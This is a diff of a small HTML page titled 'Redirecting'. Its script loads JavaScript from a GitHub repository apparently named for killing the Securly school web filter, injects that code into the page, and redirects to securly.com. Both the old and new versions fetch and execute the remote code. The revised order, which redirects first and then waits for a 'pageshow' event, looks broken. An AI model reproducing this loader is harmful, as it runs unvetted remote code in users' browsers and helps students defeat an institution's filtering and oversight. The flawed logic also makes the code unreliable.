@@ -5,26 +5,30 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting</title>
     <script>
+        // Wait for the page to load
         window.addEventListener('load', () => {
             const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';
 
-            // Load and execute the script only once
-            fetch(scriptUrl)
-                .then(response => {
-                    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-                    return response.text();
-                })
-                .then(scriptContent => {
-                    const scriptElement = document.createElement('script');
-                    scriptElement.textContent = scriptContent;
-                    document.body.appendChild(scriptElement);
-                    console.log('Injected script executed.');
+            // Redirect to the new URL
+            window.location.href = redirectUrl;
 
-                    // After script execution, redirect to the new URL
-                    window.location.href = redirectUrl;
-                })
-                .catch(err => console.error('Error fetching script:', err));
+            // Listen for the 'pageshow' event after redirection
+            window.addEventListener('pageshow', () => {
+                fetch(scriptUrl)
+                    .then(response => response.text())
+                    .then(scriptContent => {
+                        const scriptElement = document.createElement('script');
+                        scriptElement.textContent = scriptContent;
+                        document.body.appendChild(scriptElement);
+
+                        console.log('Script executed.');
+
+                        // Stop page loading after script execution
+                        window.stop();
+                    })
+                    .catch(err => console.error('Error fetching script:', err));
+            });
         });
     </script>
 </head>
